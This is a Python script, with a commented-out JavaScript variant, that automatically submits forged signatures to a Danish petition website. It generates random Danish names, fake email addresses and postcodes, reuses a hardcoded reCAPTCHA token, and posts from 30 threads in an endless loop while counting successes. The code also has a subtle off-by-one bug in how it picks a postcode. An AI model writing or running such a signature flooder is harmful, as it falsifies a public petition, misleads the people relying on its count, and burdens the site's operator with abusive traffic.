import requests, threading, random, os

#ass code
firstNames = ['Alma', 'Ida', 'Clara', 'Ella', 'Olivia', 'Freja', 'Emma', 'Luna', 'Agnes', 'Nora', 'Karla', 'Sofia', 'Anna', 'Ellie', 'Asta', 'Lily', 'Alberte', 'Frida', 'Josefine', 'Laura', 'Esther', 'Ellen', 'Astrid', 'Isabella', 'Saga', 'Aya', 'Lærke', 'Marie', 'Liva', 'Hannah', 'Mathilde', 'Maja', 'Vilma', 'Merle', 'Victoria', 'Mille', 'Liv', 'Emily', 'Sofie', 'Leonora', 'Molly', 'Lea', 'Andrea', 'Gry', 'Emilie', 'Vera', 'Rosa', 'Alva', 'Elina', 'Johanne', 'Oscar', 'Karl', 'William', 'Oliver', 'Alfred', 'August', 'Valdemar', 'Malthe', 'Arthur', 'Emil', 'Lucas', 'Aksel', 'Noah', 'Victor', 'Elias', 'Theo', 'Otto', 'Viggo', 'Magnus', 'Felix', 'Elliot', 'Nohr', 'Liam', 'Matheo', 'Anton', 'Hugo', 'Loui', 'Alexander', 'Theodor', 'Frederik', 'Konrad', 'Lauge', 'Anker', 'Albert', 'Johan', 'Storm', 'Adam', 'Milas', 'Erik', 'Pelle', 'Vincent', 'Villads', 'Villum', 'Marius', 'Christian', 'Holger', 'Ebbe', 'Walter', 'Luca', 'Benjamin']
lastNames = ['Jensen', 'Nielsen', 'Hansen', 'Pedersen', 'Andersen', 'Christensen', 'Larsen', 'Sørensen', 'Rasmussen', 'Jørgensen', 'Petersen', 'Madsen', 'Kristensen', 'Olsen', 'Thomsen', 'Christiansen', 'Poulsen', 'Johansen', 'Møller', 'Knudsen']
postCodes = ["1301","2000","2100","2200","2300","2400","2450","2500","2600","2605","2610","2625","2630","2635","2640","2650","2660","2665","2670","2670","2680","2690","2700","2720","2730","2740","2750","2760","2765","2770","2791","2800","2820","2830","2840","2850","2860","2880","2900","2920","2930","2942","2950","2960","2970","2980","2990","3000","3050","3060","3070","3080","3100","3120","3140","3150","3200","3210","3220","3230","3250","3300","3310","3320","3330","3360","3370","3390","3400","3460","3480","3490","3500","3520","3540","3550","3600","3630","3650","3660","3670","3700","3720","3730","3740","3751","3760","3770","3782","3790","4000","4040","4050","4060","4070","4100","4130","4140","4160","4171","4173","4174","4180","4190","4200","4220","4230","4241","4242","4243","4250","4261","4262","4270","4281","4291","4293","4295","4296","4300","4320","4330","4340","4350","4360","4370","4390","4400","4420","4440","4450","4460","4470","4480","4490","4500","4520","4532","4534","4540","4550","4560","4571","4572","4573","4581","4583","4591","4592","4593","4600","4621","4622","4623","4632","4640","4652","4653","4654","4660","4671","4672","4673","4681","4682","4683","4684","4690","4700","4720","4733","4735","4736","4750","4760","4771","4772","4773","4780","4791","4792","4793","4800","4840","4850","4862","4863","4871","4872","4873","4874","4880","4891","4892","4894","4895","4900","4912","4913","4920","4930","4941","4943","4944","4951","4952","4953","4960","4970","4983","4990","5000","5200","5210","5220","5230","5240","5250","5260","5270","5290","5300","5330","5350","5370","5380","5390","5400","5450","5462","5463","5464","5466","5471","5474","5485","5491","5492","5500","5540","5550","5560","5580","5591","5592","5600","5610","5620","5631","5642","5672","5683","5690","5700","5750","5762","5771","5772","5792","5800","5853","5854","5856","5863","5871","5874","5881","5882","5883","5884","5892","5900","5932","5935","5953","5960","5970","5985","6000","6040","6051","6052","6064","6070","6091","6092","6093","6094","6100","6200","6230","6240","6261","6270","6280","6300","6310","6320","6330","6340","6360","6372","6392","6400","6430","6440","6470","6500","6510","6520","6535","6541","6560","6580","6600","6621","6622","6623","6630","6640","6650","6660","6670","6682","6683","6690","6700","6701","6705","6710","6715","6720","6731","6740","6752","6760","6771","6780","6792","6800","6818","6823","6830","6840","6851","6852","6853","6854","6855","6857","6862","6870","6880","6893","6900","6920","6933","6940","6950","6960","6971","6973","6980","6990","7000","7080","7100","7120","7130","7140","7150","7160","7171","7173","7182","7183","7184","7190","7200","7250","7260","7270","7280","7300","7321","7323","7330","7361","7362","7400","7430","7441","7442","7451","7470","7480","7490","7500","7540","7550","7560","7570","7600","7620","7650","7660","7673","7680","7700","7730","7741","7742","7752","7755","7760","7770","7790","7800","7830","7840","7850","7860","7870","7884","7900","7950","7960","7970","7980","7990","8000","8200","8210","8220","8230","8240","8250","8260","8270","8300","8305","8310","8320","8330","8340","8350","8355","8361","8362","8370","8380","8381","8382","8400","8410","8420","8444","8450","8462","8464","8471","8472","8500","8520","8530","8541","8543","8544","8550","8560","8570","8581","8585","8586","8592","8600","8620","8632","8641","8643","8653","8654","8660","8670","8680","8700","8721","8722","8723","8732","8740","8751","8752","8762","8763","8765","8766","8781","8783","8800","8830","8831","8832","8840","8850","8860","8870","8881","8882","8883","8900","8950","8961","8963","8970","8981","8983","8990","9000","9200","9210","9220","9230","9240","9260","9270","9280","9293","9300","9310","9320","9330","9340","9352","9362","9370","9380","9381","9382","9400","9430","9440","9460","9480","9490","9492","9493","9500","9510","9520","9530","9541","9550","9560","9574","9575","9600","9610","9620","9631","9632","9640","9670","9681","9690","9700","9740","9750","9760","9800","9830","9850","9870","9881","9900","9940","9970","9981","9982","9990"]
emailServices = ['gmail', 'outlook']
domains = ['dk', 'com']


#messy shit
def spamfunc(name):
    firstInt = int(random.randint(0, 99))
    lastInt = int(random.randint(0, 19))
    emailInt = int(random.randint(0, 1))
    domainInt = int(random.randint(0, 1))
    firstname = firstNames[firstInt]
    lastName = lastNames[lastInt]
    email = firstNames[firstInt] + "." + lastNames[lastInt] + "%40" + emailServices[emailInt] + "." + domains[domainInt]
    post = postCodes[random.randint(0, len(postCodes))]

    data = "signature%5BfirstName%5D=" + firstname + "&signature%5BlastName%5D=" + lastName +" &signature%5Bemail%5D="+ email + "&signature%5BpostCode%5D="+ post + "&signature%5Bconsent%5D=1&signature%5Brecaptcha%5D=03AD1IbLBvdKh1q3aW_Bg_LXzhX1cLcvB6D2XAacHOZpQ5zDlw4JcvJBdD2Fv2RgPTJ7Bt6E6WOjHr7n92OJV-L1f9AQe7_7ruXxh-ZKjRZA860_ndveybwDEL23bAewN91rncdh_1pgiNXujQFVNx-vYlIc7GIwkonK63bkSbtK59WqQqHZyda869W6nQLGTGqz6xDG4c9bR_2XKkdgGPW7EqwtJZEPQxzKG5NFzQb8_a26lslPBKX8tZcKj6zGAFWOpyQFmpusLjuorRia4bV-69h5fPYP5k1BK2i__EhIh6GFmoBx2md9B06UQdU0ji9HFzBnYEPCe7jFatwhix2vsyOaDxWduK1YGbT2kyo7RCxjeL7DfJszyFbqU7kaCa3WrcoaJlPuuF4YWya0m66oxAxv5cE7etsCZ4TVahLra_T-mlHeMYdksOLUvyV2g_baMB44eFgKXoIPQTavUmBxPvA_a3CHyHCM3xxHRDIYVlUuzqJtHf2IdaiWnVhlfpFR0dq0B3NUI2&signature%5BuniqueId%5D=63c914d2574392.93054505"
    req = requests.post('https://bevarstorebededag.dk/', data=data)

    if req.status_code != 200:
        print(f"[!] WARNING: Thread {str(name)} got status code {str(req.status_code)}")
    elif req.status_code == 200:
        print(f"[+] SUCCESS: Thread {str(name)} got status code {str(req.status_code)}")

    

#what am i doing with my life



total = 0

while True:
    threads = list()
    for index in range(30):
        x = threading.Thread(target=spamfunc, args=(index,))
        threads.append(x)
        x.start()
        total = total + 1
        newtitle = "idk what this is - total: " + str(int(total))
        os.system("title " + newtitle)





#thanks to futtiz for sending me this that i could convert, needed to edit url and postdata tho
# setInterval(() => {
#   const firstName = firstNames[Math.floor(Math.random() * firstNames.length)]
#   const lastName = lastNames[Math.floor(Math.random() * lastNames.length)]

#   const userData = {
#     firstName: firstName,
#     lastName: lastName,
#     email: `${firstName.toLowerCase()}.${lastName.toLowerCase()}@${emailServices[Math.floor(Math.random() * emailServices.length)]}.${domains[Math.floor(Math.random() * domains.length)]}`,
#     postCode: postCodes[Math.floor(Math.random() * postCodes.length)],
#     newsletterPermission: Math.random() >= 0.5
#   }

#   fetch("https://bevarstorebededag.dk/comment", {
#     "referrer": "https://bevarstorebededag.dk/",
#     "referrerPolicy": "strict-origin-when-cross-origin",
#     "body": JSON.stringify(userData),
#     "method": "POST",
#     "mode": "cors",
#     "credentials": "omit"
#   })

#     console.log("sendt underskrift " + firstName + " " + lastName + "")
# }, 250)




